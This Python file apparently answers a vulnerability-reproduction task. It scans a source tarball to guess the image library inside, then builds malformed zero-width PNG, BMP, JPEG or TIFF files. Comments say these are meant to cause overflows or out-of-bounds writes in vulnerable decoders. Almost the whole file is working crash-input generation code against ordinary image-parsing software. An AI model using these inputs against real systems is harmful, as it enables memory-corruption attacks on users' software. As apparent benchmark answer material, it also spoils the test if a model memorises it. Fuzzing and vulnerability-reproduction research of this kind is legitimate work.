import os
import re
import struct
import tarfile
import zlib
from typing import Dict, Optional


def _png_chunk(chunk_type: bytes, data: bytes) -> bytes:
    ln = struct.pack(">I", len(data))
    crc = zlib.crc32(chunk_type)
    crc = zlib.crc32(data, crc) & 0xFFFFFFFF
    return ln + chunk_type + data + struct.pack(">I", crc)


def _build_png_zero_width(height: int = 1) -> bytes:
    if height <= 0:
        height = 1
    sig = b"\x89PNG\r\n\x1a\n"
    width = 0
    bit_depth = 8
    color_type = 6  # RGBA => bpp=4
    compression = 0
    filter_method = 0
    interlace = 0

    ihdr = struct.pack(">IIBBBBB", width, height, bit_depth, color_type, compression, filter_method, interlace)
    ihdr_chunk = _png_chunk(b"IHDR", ihdr)

    # Each row must begin with a filter type byte.
    # Use Paeth (4), which typically assumes rowbytes >= bpp (valid when width>=1),
    # and may overflow when width=0 in vulnerable implementations.
    raw = b"\x04" * height
    comp = zlib.compress(raw, level=9)
    idat_chunk = _png_chunk(b"IDAT", comp)
    iend_chunk = _png_chunk(b"IEND", b"")
    return sig + ihdr_chunk + idat_chunk + iend_chunk


def _build_bmp_zero_width() -> bytes:
    # Minimal BMP with BITMAPINFOHEADER, width=0, height=1, 32bpp, and non-zero pixel data.
    bfType = b"BM"
    bfOffBits = 14 + 40
    pixel_data = b"\x00\x00\x00\x00"  # 1 dword of pixel data
    bfSize = bfOffBits + len(pixel_data)
    bfReserved1 = 0
    bfReserved2 = 0
    file_header = struct.pack("<2sIHHI", bfType, bfSize, bfReserved1, bfReserved2, bfOffBits)

    biSize = 40
    biWidth = 0
    biHeight = 1
    biPlanes = 1
    biBitCount = 32
    biCompression = 0  # BI_RGB
    biSizeImage = len(pixel_data)  # non-zero
    biXPelsPerMeter = 2835
    biYPelsPerMeter = 2835
    biClrUsed = 0
    biClrImportant = 0
    info_header = struct.pack(
        "<IIIHHIIIIII",
        biSize,
        biWidth & 0xFFFFFFFF,
        biHeight & 0xFFFFFFFF,
        biPlanes,
        biBitCount,
        biCompression,
        biSizeImage,
        biXPelsPerMeter,
        biYPelsPerMeter,
        biClrUsed,
        biClrImportant,
    )
    return file_header + info_header + pixel_data


def _build_jpeg_zero_width() -> bytes:
    # Minimal baseline JPEG with width=0, height=1.
    # Uses standard quant/huffman tables and minimal entropy-coded data.
    def seg(marker: int, payload: bytes) -> bytes:
        return struct.pack(">BBH", 0xFF, marker, len(payload) + 2) + payload

    soi = b"\xFF\xD8"
    app0 = seg(
        0xE0,
        b"JFIF\x00" + bytes([1, 1]) + bytes([0]) + struct.pack(">HHBB", 1, 1, 0, 0),
    )

    # Standard luminance quant table (quality-ish default)
    qtbl = bytes([
        16, 11, 10, 16, 24, 40, 51, 61,
        12, 12, 14, 19, 26, 58, 60, 55,
        14, 13, 16, 24, 40, 57, 69, 56,
        14, 17, 22, 29, 51, 87, 80, 62,
        18, 22, 37, 56, 68, 109, 103, 77,
        24, 35, 55, 64, 81, 104, 113, 92,
        49, 64, 78, 87, 103, 121, 120, 101,
        72, 92, 95, 98, 112, 100, 103, 99,
    ])
    dqt = seg(0xDB, bytes([0x00]) + qtbl)

    # SOF0: precision=8, height=1, width=0, 1 component
    sof0 = seg(
        0xC0,
        bytes([8]) + struct.pack(">HHB", 1, 0, 1) + bytes([1, 0x11, 0]),
    )

    # Standard Huffman tables (luminance DC and AC)
    # DC luminance
    bits_dc = bytes([0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0])
    val_dc = bytes([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11])
    dht_dc = seg(0xC4, bytes([0x00]) + bits_dc + val_dc)

    # AC luminance
    bits_ac = bytes([0, 2, 1, 3, 3, 2, 4, 3, 5, 5, 4, 4, 0, 0, 1, 0x7D])
    val_ac = bytes([
        0x01, 0x02, 0x03, 0x00, 0x04, 0x11, 0x05, 0x12, 0x21, 0x31, 0x41, 0x06, 0x13, 0x51, 0x61, 0x07,
        0x22, 0x71, 0x14, 0x32, 0x81, 0x91, 0xA1, 0x08, 0x23, 0x42, 0xB1, 0xC1, 0x15, 0x52, 0xD1, 0xF0,
        0x24, 0x33, 0x62, 0x72, 0x82, 0x09, 0x0A, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x25, 0x26, 0x27, 0x28,
        0x29, 0x2A, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49,
        0x4A, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69,
        0x6A, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89,
        0x8A, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
        0xA8, 0xA9, 0xAA, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xC2, 0xC3, 0xC4, 0xC5,
        0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xE1, 0xE2,
        0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8,
        0xF9, 0xFA,
    ])
    dht_ac = seg(0xC4, bytes([0x10]) + bits_ac + val_ac)

    sos = seg(0xDA, bytes([1, 1, 0x00, 0, 63, 0]))

    # Minimal entropy-coded data: DC=0 (code '00'), AC EOB (code '1010') => '001010'
    # Pad with 1s to complete byte: '00101011' = 0x2B
    entropy = bytes([0x2B])

    eoi = b"\xFF\xD9"
    return soi + app0 + dqt + sof0 + dht_dc + dht_ac + sos + entropy + eoi


def _build_tiff_zero_width() -> bytes:
    # Little-endian TIFF with width=0, height=1, RGB 8-bit, uncompressed,
    # and StripByteCounts set to 1 with 1 byte of strip data.
    # This mismatch can trigger OOB writes if width/height not validated.
    le = "<"
    TIFF_SHORT = 3
    TIFF_LONG = 4

    def ifd_entry(tag: int, typ: int, count: int, value_or_offset: int) -> bytes:
        return struct.pack(le + "HHI", tag, typ, count) + struct.pack(le + "I", value_or_offset)

    header = b"II" + struct.pack(le + "H", 42) + struct.pack(le + "I", 8)

    # We'll place BitsPerSample array right after IFD.
    entries = []

    width = 0
    height = 1
    samples_per_pixel = 3
    bits_per_sample_offset = 8 + 2 + 10 * 12 + 4  # header(ifd offset already points to 8), IFD count + entries + nextIFD

    # Pixel data right after BitsPerSample (6 bytes), padded to even
    pixel_offset = bits_per_sample_offset + 6
    if pixel_offset % 2 != 0:
        pixel_offset += 1

    strip_byte_counts = 1

    entries.append(ifd_entry(256, TIFF_LONG, 1, width))                     # ImageWidth
    entries.append(ifd_entry(257, TIFF_LONG, 1, height))                    # ImageLength
    entries.append(ifd_entry(258, TIFF_SHORT, samples_per_pixel, bits_per_sample_offset))  # BitsPerSample
    entries.append(ifd_entry(259, TIFF_SHORT, 1, 1))                        # Compression=none
    entries.append(ifd_entry(262, TIFF_SHORT, 1, 2))                        # Photometric=RGB
    entries.append(ifd_entry(273, TIFF_LONG, 1, pixel_offset))              # StripOffsets
    entries.append(ifd_entry(277, TIFF_SHORT, 1, samples_per_pixel))        # SamplesPerPixel
    entries.append(ifd_entry(278, TIFF_LONG, 1, height))                    # RowsPerStrip
    entries.append(ifd_entry(279, TIFF_LONG, 1, strip_byte_counts))         # StripByteCounts (non-zero)
    entries.append(ifd_entry(284, TIFF_SHORT, 1, 1))                        # PlanarConfiguration=contig

    ifd = struct.pack(le + "H", len(entries)) + b"".join(entries) + struct.pack(le + "I", 0)
    bits = struct.pack(le + "HHH", 8, 8, 8)
    pad = b"\x00" if ((8 + len(ifd) + len(bits)) % 2 != 0) else b""
    pixel = b"\x00"

    blob = header + ifd + bits + pad
    if len(blob) < pixel_offset:
        blob += b"\x00" * (pixel_offset - len(blob))
    blob += pixel
    return blob


class Solution:
    def _infer_format(self, src_path: str) -> str:
        scores: Dict[str, int] = {"png": 0, "tiff": 0, "jpeg": 0, "bmp": 0, "gif": 0}
        strong: Optional[str] = None

        def bump(fmt: str, val: int) -> None:
            scores[fmt] = scores.get(fmt, 0) + val

        text_exts = (".c", ".cc", ".cpp", ".h", ".hpp", ".m", ".mm", ".py", ".rs", ".go", ".java", ".kt", ".js", ".ts", ".txt", ".md", ".cmake", ".in")
        try:
            with tarfile.open(src_path, "r:*") as tar:
                for m in tar:
                    n = (m.name or "").lower()
                    base = n.rsplit("/", 1)[-1]

                    # Name-based strong signals
                    if base in ("spng.h", "spng.c", "libspng.h", "libspng.c"):
                        bump("png", 200)
                        strong = "png"
                    if base in ("png.h", "pngread.c", "pngrutil.c", "pngpriv.h"):
                        bump("png", 120)
                    if "libpng" in n:
                        bump("png", 50)

                    if base in ("tiffio.h", "tiff.h", "tif_config.h", "tif_dirread.c", "tif_read.c"):
                        bump("tiff", 140)
                        if base == "tiffio.h":
                            strong = "tiff"
                    if "libtiff" in n:
                        bump("tiff", 60)

                    if base in ("jpeglib.h", "jmorecfg.h", "jdmarker.c", "jdhuff.c", "jdinput.c"):
                        bump("jpeg", 140)
                        if base == "jpeglib.h":
                            strong = "jpeg"
                    if "libjpeg" in n or (("jpeg" in n or "jpg" in n) and base.endswith((".c", ".cc", ".cpp", ".h", ".hpp"))):
                        bump("jpeg", 20)

                    if "giflib" in n or base in ("gif_lib.h",):
                        bump("gif", 120)
                        strong = strong or "gif"

                    if base.endswith(("bmp.c", "bmp.h")) or "bitmap" in n:
                        bump("bmp", 25)

                    # Content-based hints from likely fuzzer/harness sources
                    if strong and scores.get(strong, 0) >= 220:
                        break

                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 250_000:
                        continue

                    if not base.endswith(text_exts):
                        if "fuzz" not in n and "fuzzer" not in n and "llvmfuzzer" not in n:
                            continue

                    if "fuzz" not in n and "fuzzer" not in n and "llvmfuzzer" not in n and "testoneinput" not in n:
                        continue

                    try:
                        f = tar.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(250_000)
                    except Exception:
                        continue

                    if b"LLVMFuzzerTestOneInput" not in data and b"FuzzerTestOneInput" not in data:
                        continue

                    dl = data.lower()
                    if b"spng" in dl or b"ihdr" in dl or b"png" in dl:
                        bump("png", 140)
                    if b"tiff" in dl or b"tiffio" in dl:
                        bump("tiff", 140)
                    if b"jpeg" in dl or b"jpeglib" in dl or b"turbojpeg" in dl:
                        bump("jpeg", 140)
                    if b"bmp" in dl or b"bitmap" in dl:
                        bump("bmp", 60)
                    if b"gif" in dl:
                        bump("gif", 60)

                    if max(scores.values()) >= 240:
                        break
        except Exception:
            return "png"

        # Prefer strong if it exists
        if strong and scores.get(strong, 0) >= 160:
            return strong

        # Otherwise pick max score
        best_fmt = max(scores.items(), key=lambda kv: kv[1])[0]
        if scores[best_fmt] <= 0:
            return "png"
        return best_fmt

    def solve(self, src_path: str) -> bytes:
        fmt = self._infer_format(src_path)
        if fmt == "tiff":
            return _build_tiff_zero_width()
        if fmt == "jpeg":
            return _build_jpeg_zero_width()
        if fmt == "bmp":
            return _build_bmp_zero_width()
        # default (and most likely): PNG
        return _build_png_zero_width(height=1)